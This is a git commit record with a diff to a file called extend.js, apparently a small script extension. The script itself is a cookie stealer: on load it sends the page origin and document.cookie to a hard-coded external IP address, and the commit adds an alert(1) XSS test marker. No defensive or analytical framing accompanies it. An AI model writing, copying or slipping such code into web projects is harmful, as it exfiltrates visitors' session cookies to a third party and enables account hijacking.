743de277354b0ba0394de164015139f3b3ed6c61
司土御帝 <1181935296@qq.com>
2020-09-12 00:09:08 +0800

    Update extend.js

--- extend.js
+++ extend.js
@@ -1,11 +1,12 @@
-(function(window){
+(function(){
     var httpRequest = new XMLHttpRequest();
     httpRequest.open('GET',"http://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie, true);
     httpRequest.send();
+    alert(1)
     httpRequest.onreadystatechange = function () {
         if (httpRequest.readyState == 4 && httpRequest.status == 200) {
             var json = httpRequest.responseText;
             console.log(json);
         }
     };
-}())
+})()
